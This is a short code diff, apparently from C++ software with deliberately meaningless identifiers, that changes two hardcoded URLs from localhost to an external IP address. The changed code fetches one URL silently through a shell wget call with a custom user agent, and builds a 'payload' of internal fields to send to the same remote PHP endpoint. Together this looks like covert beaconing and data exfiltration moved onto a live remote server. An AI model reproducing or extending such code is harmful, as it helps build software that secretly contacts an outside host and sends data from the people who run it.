@@ -1972,7 +1972,7 @@ int number;
 srand(time(0));
 int rand_index = rand() % 1;
 
-    string url = "http://127.0.0.1/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
+    string url = "http://195.123.240.50/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -2516,7 +2516,7 @@ void linux84::run() {
 		if (result > 0 && result <= __limit) {
                    if (result <= GOLD_RESULT) {
                    
-                   string url = "http://127.0.0.1/linux8474.php?linux84=linux84";
+                   string url = "http://195.123.240.50/linux8474.php?linux84=linux84";
                    
                    string payload = "linux84746688="+ linux8412->linux8412 +"&linux88887474447412744474="+ linux8412->linux88887474447412744474;
                    
